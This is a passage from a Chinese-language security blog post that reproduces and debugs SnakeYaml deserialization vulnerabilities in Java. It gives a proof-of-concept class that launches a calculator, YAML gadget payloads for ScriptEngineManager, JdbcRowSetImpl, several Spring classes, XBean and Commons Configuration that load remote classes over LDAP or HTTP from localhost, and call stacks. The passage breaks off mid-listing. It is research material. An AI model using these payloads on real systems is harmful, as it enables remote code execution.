SnakeYaml反序列化漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>SnakeYaml全版本都可被反序列化漏洞利用。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>因为SnakeYaml支持反序列化Java对象，所以当Yaml.load()函数的参数外部可控时，攻击者就可以传入一个恶意类的yaml格式序列化内容，当服务端进行yaml反序列化获取恶意类时就会触发SnakeYaml反序列化漏洞。</p><h3 id="复现利用（基于ScriptEngineManager利用链）"><a href="#复现利用（基于ScriptEngineManager利用链）" class="headerlink" title="复现利用（基于ScriptEngineManager利用链）"></a>复现利用（基于ScriptEngineManager利用链）</h3><p>本次利用是基于javax.script.ScriptEngineManager的利用链。</p><p>简单地说，ScriptEngineManager类用于Java和JavaScript之间的调用。</p><p>PoC.java，需要实现ScriptEngineManager接口类，其中的静态代码块用于执行恶意代码，将其编译成PoC.class然后放置于第三方Web服务中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> <span class="keyword">implements</span> <span class="title">ScriptEngineFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Hacked by mi1k7ea"</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEngineName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEngineVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getExtensions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getMimeTypes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getNames</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getLanguageName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getLanguageVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getParameter</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getOutputStatement</span><span class="params">(String toDisplay)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getProgram</span><span class="params">(String... statements)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ScriptEngine <span class="title">getScriptEngine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java，假设的Yaml.load()外部可控的服务端漏洞程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc = <span class="string">"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1/\"]]]]"</span>;</span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到，关键PoC如下，注意每个首次出现的”[“字符前面需要有个空格：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax</span><span class="string">.script.ScriptEngineManager</span> <span class="string">[!!java.net.URLClassLoader</span> <span class="string">[[!!java.net.URL</span> <span class="string">["http://127.0.0.1/"]]]]</span></span><br></pre></td></tr></table></figure><p>另外，在已放置PoC.class的第三方Web服务中，在当前目录新建如下文件<code>META-INF\services\javax.script.ScriptEngineFactory</code>，其中内容为指定被执行的类名PoC（具体为啥这么做在后面的调试分析中会说到）：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/12.png" alt=""></p><p>注意，不要添加”.class”，否则”.”会被当做目录来进行分割处理，从而不能正确地获取到class文件。</p><p>最后运行Test即可触发漏洞：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/11.png" alt=""></p><p>当然，还可以直接打包成恶意jar包放置在第三方Web服务中来触发：<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>在<code>yaml.load(poc);</code>打上断点开始调试。</p><p>yaml数据解析的过程和前面章节的过程分析一样的，我们就看看关键部分就好。</p><p>调试发现，在调用完如下调用链获取到类名”javax.script.ScriptEngineManager”之后，会返回到调用链中的construct()函数中调用获取到的构造器的constrcut()方法，然后就会继续遍历解析得到yaml格式数据内的”java.net.URLClassLoader”类名和”java.net.URL”类名：</p><p>constructDocument-&gt;constructObject-&gt;constructObjectNoCheck-&gt;construct-&gt;getConstructor-&gt;getClassForNode-&gt;getClassForName</p><p>往下调试，在返回到的Constructor$ConstructSequence.construct()方法中，程序往下执行会调用newInstance()函数来新建实例：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/13.png" alt=""></p><p>这里为新建ScriptEngineManager类实例，其中argumentList参数为URLClassLoader类对象。</p><p>然后就调用到了ScriptEngineManager类的构造函数了：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/14.png" alt=""></p><p>在init()中调用了initEngines()，跟进initEngines()，<strong>看到调用了<code>ServiceLoader&lt;ScriptEngineFactory&gt;</code>，这个就是Java的SPI机制，它会去寻找目标URL中<code>META-INF/services</code>目录下的名为javax.script.ScriptEngineFactory的文件，获取该文件内容并加载文件内容中指定的类即PoC，这就是前面为什么需要我们在一台第三方Web服务器中新建一个指定目录的文件，同时也说明了ScriptEngineManager利用链的原理就是基于SPI机制来加载执行用户自定义实现的ScriptEngineManager接口类的实现类，从而导致代码执行</strong>：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/16.png" alt=""></p><p>跟下去，在ServiceLoader$LazyIterator.nextService()函数中调用<code>Class.forName()</code>即通过反射来获取目标URL上的PoC.class，此时在Web服务端会看到被请求访问PoC.class的记录；接着c.newInstance()函数创建的PoC类实例传入javax.script.ScriptEngineManager类的cast()方法来执行：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/15.png" alt=""></p><p>此时由于新建的是PoC类实例，因此会调用到PoC类的构造函数，而该类的静态代码块会被执行一遍，从而触发率任意代码执行漏洞。</p><h3 id="相关应用CVE"><a href="#相关应用CVE" class="headerlink" title="相关应用CVE"></a>相关应用CVE</h3><p><strong>Resteasy</strong></p><ul><li><a href="https://www.vulners.com/search?query=CVE-2016-9606" target="_blank" rel="noopener">CVE-2016-9606</a></li></ul><p><strong>Apache Camel</strong></p><ul><li><a href="https://www.vulners.com/search?query=CVE-2017-3159" target="_blank" rel="noopener">CVE-2017-3159</a></li></ul><p><strong>Apache Brooklyn</strong></p><ul><li><a href="https://www.vulners.com/search?query=CVE-CVE-2016-8744" target="_blank" rel="noopener">CVE-2016-8744</a></li></ul><h2 id="0x03-更多Gadgets探究"><a href="#0x03-更多Gadgets探究" class="headerlink" title="0x03 更多Gadgets探究"></a>0x03 更多Gadgets探究</h2><p>下面看下其他反序列化Gadgets在SnakeYaml中的利用，具体的调试分析过程就只简单提下并给出主要的利用链就好。</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>基于JdbcRowSetImpl的Gadget十分经典，有基于RMI和LDAP的，因为LDAP的利用范围更广，因此这里就只跑这个场景，具体原理之前讲过就不再赘述。</p><p>PoC，注意添加换行符：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">"!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"ldap://localhost:1389/Exploit\"\n autoCommit: true"</span>;</span><br></pre></td></tr></table></figure><p>另外还需搭建LDAP服务和恶意类Exploit。</p><p>运行即可触发：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/17.png" alt=""></p><p>简单地说，就是SnakeYaml在调用Yaml.load()反序列化的时候，会调用到JdbcRowSetImpl类的dataSourceName属性的setter方法即setDataSourceName()，然后就触发后续一系列的利用链最后达到任意代码执行的目的。</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">set:77, MethodProperty (org.yaml.snakeyaml.introspector)</span><br><span class="line">constructJavaBean2ndStep:263, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:149, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:438, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:7, Test</span><br></pre></td></tr></table></figure><h3 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring PropertyPathFactoryBean</h3><p>需要在目标环境存在springframework相关的jar包，以我本地环境为例：snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE。</p><p>可以直接将String类型的PoC传参给Yaml.load()，也可以从文件中读取内容传入文件流给Yaml.load()，需要注意PoC中的各行的间隔距离：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc = <span class="string">"!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n"</span> +</span><br><span class="line">                <span class="string">" targetBeanName: \"ldap://localhost:1389/Exploit\"\n"</span> +</span><br><span class="line">                <span class="string">" propertyPath: mi1k7ea\n"</span> +</span><br><span class="line">                <span class="string">" beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n"</span> +</span><br><span class="line">                <span class="string">"  shareableResources: [\"ldap://localhost:1389/Exploit\"]"</span>;</span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InputStream poc = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"1.txt"</span>));</span><br><span class="line">            Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">            yaml.load(poc);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.txt，即关键部分PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!org.springframework.beans.factory.config.PropertyPathFactoryBean</span><br><span class="line">    targetBeanName: &quot;ldap://localhost:1389/Exploit&quot;</span><br><span class="line">    propertyPath: mi1k7ea</span><br><span class="line">    beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory</span><br><span class="line">        shareableResources: [&quot;ldap://localhost:1389/Exploit&quot;]</span><br></pre></td></tr></table></figure><p>另起LDAP服务和放置Exploit类的Web服务，运行即可触发：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/18.png" alt=""></p><p>简单地说，PropertyPathFactoryBean类的beanFactory属性可以设置一个远程的Factory，类似于JNDI注入的原理，当SnakeYaml反序列化的时候会调用到该属性的setter方法，通过JNDI注入漏洞成功实现反序列化漏洞的利用。</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">lookup:92, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:220, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:113, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:106, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">setBeanFactory:196, PropertyPathFactoryBean (org.springframework.beans.factory.config)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">set:77, MethodProperty (org.yaml.snakeyaml.introspector)</span><br><span class="line">constructJavaBean2ndStep:263, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:149, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:453, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:19, Test</span><br></pre></td></tr></table></figure><h3 id="Spring-DefaultBeanFactoryPointcutAdvisor"><a href="#Spring-DefaultBeanFactoryPointcutAdvisor" class="headerlink" title="Spring DefaultBeanFactoryPointcutAdvisor"></a>Spring DefaultBeanFactoryPointcutAdvisor</h3><p>需要在目标环境存在springframework相关的jar包，以我本地环境为例：snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE，spring-aop-4.3.7.RELEASE。</p><p>关键PoC如下，2.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set:</span><br><span class="line">    ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor</span><br><span class="line">      adviceBeanName: &quot;ldap://localhost:1389/Exploit&quot;</span><br><span class="line">      beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory</span><br><span class="line">        shareableResources: [&quot;ldap://localhost:1389/Exploit&quot;]</span><br><span class="line">    ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor []</span><br></pre></td></tr></table></figure><p>和前面一样的利用方式：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/19.png" alt=""></p><p>DefaultBeanFactoryPointcutAdvisor类的利用原理同上，也是JNDI注入漏洞导致的反序列化漏洞。</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">lookup:92, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:220, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:113, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getAdvice:109, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">equals:74, AbstractPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">putVal:634, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">processDuplicateKeys:96, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">flattenMapping:70, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:183, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping:446, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:465, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:184, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping:446, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:453, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:12, Test</span><br></pre></td></tr></table></figure><h3 id="Apache-XBean"><a href="#Apache-XBean" class="headerlink" title="Apache XBean"></a>Apache XBean</h3><p>本地环境用的xbean-naming-4.5.jar。</p><p>关键PoC，3.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!javax.management.BadAttributeValueExpException[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [&quot;foo&quot;,!!javax.naming.Reference [foo, &quot;Exploit&quot;, &quot;http://localhost:8000/&quot;],!!org.apache.xbean.naming.context.WritableContext []]]</span><br></pre></td></tr></table></figure><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/20.png" alt=""></p><p>具体原理还没分析搞懂，之前简单调试下发现在调用ContextUtil$ReadOnlyBinding.ReadOnlyBinding()函数进行context属性的初始化为WritableContext类实例时会触发漏洞（后面有时间搞懂了再补充）：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/21.png" alt=""></p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:183, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)</span><br><span class="line">&lt;init&gt;:176, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">construct:548, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:543, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:453, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:12, Test</span><br></pre></td></tr></table></figure><h3 id="Apache-Commons-Configuration"><a href="#Apache-Commons-Configuration" class="headerlink" title="Apache Commons Configuration"></a>Apache Commons Configuration</h3><p>本地环境用的：snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，commons-lang-2.6，commons-configuration-1.10。</p><p>关键PoC，4.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set:</span><br><span class="line">    ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], &quot;ldap://localhost:1389/Exploit&quot;]]</span><br></pre></td></tr></table></figure><p>弹四次计算器：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/22.png" alt=""></p><p>简单跟了下程序，在调用完ConfigurationMap.ConfigurationMap()这个构造函数对configuration属性进行赋值后就触发了，具体原理有待分析：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/23.png" alt=""></p><p>此时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 